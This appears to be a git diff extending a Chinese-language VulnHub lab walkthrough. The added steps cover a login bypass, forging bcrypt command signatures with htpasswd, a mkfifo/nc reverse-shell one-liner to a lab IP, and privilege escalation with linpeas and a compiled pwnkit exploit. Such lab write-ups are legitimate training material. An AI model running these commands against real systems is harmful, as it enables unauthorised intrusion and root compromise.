@@ -1,5 +1,5 @@
 # 靶机信息
-
+这是一个需要打靶经验，并且需要不断试错的vulnhub渗透测试靶机，从黑盒思维判断登录验证逻辑，绕过登录校验，再对加解密的理解，以及RCE的不断试错，再到最后的提权，给个困难难度。
 
 # 信息收集
 ## NMAP扫描
@@ -74,8 +74,28 @@ Nmap done: 1 IP address (1 host up) scanned in 40.81 seconds
 
 <img width="1916" height="910" alt="Image" src="https://github.com/user-attachments/assets/b2f49a5a-4241-404f-9c58-12725bae70fc" />
 
-那么初步判断是将command中的命令加密作为签名。
+那么初步判断是将command中的命令加密作为签名。并且在后续尝试发现对他的salt值也不固定，随机的也行。
+使用一下命令生成没有用户名的签名
+
+>htpasswd -bnBC "10" "" "ls" | tr -d ':\n'    
+
 
 <img width="1919" height="968" alt="Image" src="https://github.com/user-attachments/assets/dbaefdb9-19c8-4b5b-8f61-9b418c383b11" />
 
-确实是这样
+确实是这样。
+
+# 漏洞利用
+开始获取shell
+再尝试bash，sh，nc之后我发现有报错命令报错会弹窗error，不知道为什么不行，最后使用`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.218.148 4444 > /tmp/f`反弹成功。
+
+# 提权
+直接上linpeas扫一遍
+
+<img width="1919" height="774" alt="Image" src="https://github.com/user-attachments/assets/ab3da31e-8f95-4794-a864-d487945429ac" />
+
+没有其他明显的提权提示，所以我就直接尝试内核提权，先试第一个，可行性最高
+使用`gcc --static pwnkit.c -o exp` 静态编译，以免环境
+
+<img width="1919" height="669" alt="Image" src="https://github.com/user-attachments/assets/4509aef5-7d9c-4168-8dd3-b7fbd4f1c69a" />
+
+提权成功。
